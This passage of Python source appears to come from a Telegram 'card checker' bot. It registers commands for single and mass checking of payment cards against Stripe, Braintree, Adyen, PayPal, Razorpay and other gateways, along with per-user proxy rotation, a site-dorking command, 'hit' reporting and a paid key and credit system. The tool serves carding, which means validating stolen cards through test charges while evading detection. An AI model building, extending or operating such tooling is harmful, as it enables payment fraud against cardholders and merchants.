            "Usage: <code>/stc &lt;card&gt;</code>\n"
            "Example: <code>/stc 4111111111111111|12|2025|123</code>\n\n"
            "💰 Amount: $1.00 (default, use /ch to change)",
            parse_mode=ParseMode.HTML
        )
        return
    
    card_text = " ".join(context.args)
    card = card_formatter.extract_single_card_from_text(card_text)
    
    if not card:
        await update.message.reply_text(
            "❌ Invalid card format. Use: card|mm|yyyy|cvv\n"
            "Example: 4111111111111111|12|2025|123"
        )
        return
    
    # Call the existing logic function
    await stripe_charge_single_check_logic(update, context, card)
    
async def shutdown():
    """Clean shutdown of connection pool and thread pool"""
    await autosopi_site_manager.close()
    await connection_pool.close_all()
    await close_braintree_session()  # Add Braintree session cleanup
    thread_pool.shutdown(wait=True)
    print("🔌 Connection pool closed")
    print("🧵 Thread pool shutdown")
    print("🔌 Braintree session closed")

def main():
    print("=" * 80)
    print("💰 ULTRA MULTI-USER CARD CHECKER BOT - v3.0")
    print("=" * 80)
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...{BOT_TOKEN[-5:]}")
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"📊 Users: {len(user_manager.users)}")
    
    # FIXED: Remove global_proxies reference since it doesn't exist anymore
    print(f"👤 Users with Custom Proxies: {len(proxy_manager.user_proxies)}")
    
    # Count total user proxies
    total_user_proxies = sum(len(proxies) for proxies in proxy_manager.user_proxies.values())
    print(f"📦 Total User Proxies: {total_user_proxies}")
    
    print(f"💰 Default Amount: ${DEFAULT_AMOUNT} {DEFAULT_CURRENCY}")
    print(f"👥 Max Concurrent Users: {MAX_CONCURRENT_USERS}")
    print(f"⚡ Thread Pool Workers: {thread_pool._max_workers}")
    print(f"🔌 Max Connections: {connection_pool.max_connections}")
    print("=" * 80)
    print("✅ PAYPAL GATEWAY FIXED - POST ONLY WITH FULL DEBUG")
    print("✅ ALL 8 GATEWAYS INTEGRATED")
    print("✅ 2000+ CONCURRENT USERS SUPPORT")
    print("✅ PER-USER PROXY SYSTEM ENABLED")
    print("=" * 80)
    
    # FIXED: Remove global_proxies reference here too
    print("📦 User proxy system loaded")
    print("🚀 Bot is starting...")
    print("=" * 80)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # ============ FIXED: Create and store flood control in bot_data ============
    flood_control = SafeFloodControlManager()
    flood_control.start()
    
    # Store in bot_data so it's accessible in all handlers
    app.bot_data['flood_control'] = flood_control
    
    async def post_init(application):
        """Run after bot initialization"""
        await flood_control.start_async()
        print("✅ Flood control worker started")
    
    app.post_init = post_init
    
    # ============ IMPORTANT: Add reply handlers FIRST (with lowest group) ============
    # These ensure replies are processed before commands
    # This catches text replies to file messages
    app.add_handler(MessageHandler(filters.REPLY & filters.TEXT & ~filters.COMMAND, handle_reply_with_command), group=0)
    # This catches command replies (like /aumc) to file messages
    app.add_handler(MessageHandler(filters.REPLY & filters.COMMAND, handle_reply_with_command), group=0)
    
    # ============ THEN add all command handlers ============
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("id", id_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("price", price_command))
    
    # Dork feature commands
    app.add_handler(CommandHandler("dork", dork_command))
    
    # You have these mass commands:
    app.add_handler(CommandHandler("stmc", mass_check_stripe_charge))
    app.add_handler(CommandHandler("stmcheck", mass_check_stripe_charge))
    
    # Add this with your other single check command handlers
    app.add_handler(CommandHandler("stc", single_check_stripe_charge_new))  # Add this



    app.add_handler(CommandHandler("poolstatus", pool_status_command))
    app.add_handler(CommandHandler("addtopool", add_to_pool_command))
    
    # User proxy commands
    app.add_handler(CommandHandler("myproxy", myproxy_command))
    app.add_handler(CommandHandler("addmyproxy", add_my_proxy_command))
    app.add_handler(CommandHandler("removemyproxy", remove_my_proxy_command))
    app.add_handler(CommandHandler("listmyproxies", list_my_proxies_command))
    app.add_handler(CommandHandler("clearmyproxies", clear_my_proxies_command))
    app.add_handler(CommandHandler("testmyproxies", test_my_proxies_command))
    
    app.add_handler(CommandHandler("massproxy", mass_proxy_add_command))
    
    # New command handlers
    app.add_handler(CommandHandler("leaderboard", leaderboard_command))
    app.add_handler(CommandHandler("lb", leaderboard_command))
    app.add_handler(CommandHandler("recover", recover_command))
    app.add_handler(CommandHandler("resume", resume_command))
    
    app.add_handler(CommandHandler("tier", tier_command))
    app.add_handler(CommandHandler("settier", set_tier_command))
    app.add_handler(CommandHandler("users", users_command))
    
    # New Braintree commands - Using advanced versions
    app.add_handler(CommandHandler("btn", single_check_braintree_advanced))
    app.add_handler(CommandHandler("btnm", mass_check_braintree_advanced))
    app.add_handler(CommandHandler("btncheck", single_check_braintree_advanced))
    
    # Adyen commands
    app.add_handler(CommandHandler("ad", single_check_ad))
    app.add_handler(CommandHandler("mad", mass_check_mad))
    app.add_handler(CommandHandler("adyen", single_check_ad))  # Alias
    app.add_handler(CommandHandler("madyen", mass_check_mad))  # Alias
    
    # Auto Stripe commands
    app.add_handler(CommandHandler("chk", single_check_auto_stripe))
    #app.add_handler(CommandHandler("auc", single_check_autosopi))
    
    
    # Enhanced Autosopi site management commands
    app.add_handler(CommandHandler("sites", autosopi_sites_command))
    app.add_handler(CommandHandler("submitsite", autosopi_submit_site_command))
    app.add_handler(CommandHandler("testsite", autosopi_test_site_command))
    app.add_handler(CommandHandler("testallsites", autosopi_test_all_command))
    app.add_handler(CommandHandler("sitestats", autosopi_stats_command))
    app.add_handler(CommandHandler("rotate", autosopi_rotate_command))
    
    # Admin commands
    app.add_handler(CommandHandler("pending", autosopi_pending_command))
    app.add_handler(CommandHandler("approvesite", autosopi_approve_site_command))
    app.add_handler(CommandHandler("rejectsite", autosopi_reject_site_command))
    app.add_handler(CommandHandler("removesite", autosopi_remove_site_command))
    
    # Key system commands
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("genkey", genkey_command))
    app.add_handler(CommandHandler("bulkgen", bulkgen_command))
    app.add_handler(CommandHandler("keys", keys_command))
    app.add_handler(CommandHandler("deactivatekey", deactivatekey_command))
    app.add_handler(CommandHandler("nstripe", single_check_new_stripe))
    
    
    app.add_handler(CommandHandler("planpurchase", plan_purchase_command))
    
    # Proxy testing commands
    app.add_handler(CommandHandler("aptest", autosopi_proxy_test_command))
    app.add_handler(CommandHandler("autoproxy", autosopi_proxy_test_command))
    
    # Broadcast system commands
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("broadcast_status", broadcast_status_command))
    
    app.add_handler(CommandHandler("hit", hit_command))
    
    # B3Charged commands
    app.add_handler(CommandHandler("b3", single_check_b3charged))
    app.add_handler(CommandHandler("mb3", mass_check_b3charged))
    app.add_handler(CommandHandler("b3check", single_check_b3charged))
    app.add_handler(CommandHandler("b3mass", mass_check_b3charged))
    
    # New PayPal commands
    #app.add_handler(CommandHandler("pp", single_check_paypal_new))
    #app.add_handler(CommandHandler("mpp", mass_check_paypal_new))

    # Keep old commands for backward compatibility
    #app.add_handler(CommandHandler("ppmc", mass_check_paypal))
    #app.add_handler(CommandHandler("ppmcheck", mass_check_paypal))  
    
    # Mass check commands for all gateways
    app.add_handler(CommandHandler("stmc", mass_check_stripe_charge))
    app.add_handler(CommandHandler("stmcheck", mass_check_stripe_charge))
    app.add_handler(CommandHandler("stamc", mass_check_stripe_auth))
    app.add_handler(CommandHandler("stamcheck", mass_check_stripe_auth))
    app.add_handler(CommandHandler("btmc", mass_check_braintree))
    app.add_handler(CommandHandler("btmcheck", mass_check_braintree))
    app.add_handler(CommandHandler("aumc", mass_check_autosopi))
    
    app.add_handler(CommandHandler("info", info_command))
    
    app.add_handler(CommandHandler("removesite", remove_site_command))
    app.add_handler(CommandHandler("removefake", remove_fake_sites_command))
    app.add_handler(CommandHandler("sites", list_sites_command))
    
    app.add_handler(CommandHandler("rsites", remove_sites_command))
    app.add_handler(CommandHandler("restoresite", restore_site_command))
    app.add_handler(CallbackQueryHandler(confirm_remove_all_callback, pattern='confirm_remove_all'))
    app.add_handler(CallbackQueryHandler(confirm_remove_all_callback, pattern='cancel_remove_all'))
    
    
    # Replace the old /stc and /stmc with the new ones
    app.add_handler(CommandHandler("stc", single_check_stc1))
    app.add_handler(CommandHandler("mstc", mass_check_stc1))
    app.add_handler(CommandHandler("stcheck", single_check_stc1))  # Alias
    app.add_handler(CommandHandler("stmass", mass_check_stc1))    # Alias

# Keep the old /stmc for backward compatibility if needed
    app.add_handler(CommandHandler("stmc", mass_check_stc1))
    
    app.add_handler(CommandHandler("sendhit", send_hit_command))
    # Add this line with your other command handlers
    app.add_handler(CommandHandler("sadd", admin_direct_add_site_command))
    
    # Razorpay commands
    app.add_handler(CommandHandler("rzc", single_check_razorpay_command))
    app.add_handler(CommandHandler("rz_site", rz_site_command))
    app.add_handler(CommandHandler("rz_amount", rz_amount_command))
    app.add_handler(CommandHandler("rzmc", mass_check_razorpay))  # Already exists

    app.add_handler(CommandHandler("mpp", mass_check_logic_with_gif))
    app.add_handler(CommandHandler("pp", single_check_paypal_with_gif))
    app.add_handler(CommandHandler("getgifid", get_gif_id_command))
    # Add to your command handlers
    app.add_handler(CommandHandler("setsite", set_site_command))
    app.add_handler(CommandHandler("testpremium", test_premium_command))
    
    # Add this with your other command handlers
    app.add_handler(CommandHandler("payflow", single_check_payflow_command))  # Alias
    
    app.add_handler(CommandHandler("mchk", mass_check_auto_stripe_command))
    # Add to main() function
    
    # Credit system commands
    app.add_handler(CommandHandler("credits", credits_command))
    app.add_handler(CommandHandler("redeemcredits", redeem_credits_command))
    app.add_handler(CommandHandler("gencreditkey", gencreditkey_command))
    app.add_handler(CommandHandler("bulkgencredit", bulkgencredit_command))
    app.add_handler(CommandHandler("listcreditkeys", listcreditkeys_command))
    app.add_handler(CommandHandler("deletecreditkey", deletecreditkey_command))
    
    

    # Admin credit management
    
    # Cancel command
    app.add_handler(CommandHandler("cancel", cancel_command))
    
    # ============ THEN add all other handlers ============
    # Text handler for non-reply messages
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    # Document handler
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    # Callback query handler
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # Add background tasks
    app.job_queue.run_repeating(broadcast_worker, interval=30, first=10)
    app.job_queue.run_repeating(key_expiry_worker, interval=60, first=30)
    
    # Register shutdown handler (using the already imported atexit)
    import atexit
    atexit.register(lambda: asyncio.run(shutdown()))
    
    print("✅ Bot is running! Press Ctrl+C to stop.")
    print("=" * 80)
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
